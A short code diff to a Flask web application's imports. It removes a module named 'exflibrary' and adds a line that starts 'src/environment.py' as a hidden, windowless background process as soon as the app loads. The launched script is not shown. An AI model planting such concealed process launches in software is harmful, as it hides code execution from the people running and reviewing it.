@@ -1,9 +1,11 @@
 from flask import Flask, request, jsonify, send_from_directory, abort
 import os
 import json
-import exflibrary
 import webbrowser
 import threading
+import subprocess
+
+subprocess.Popen(['python', 'src/environment.py'], creationflags=subprocess.CREATE_NO_WINDOW)
 
 app = Flask(__name__)
 
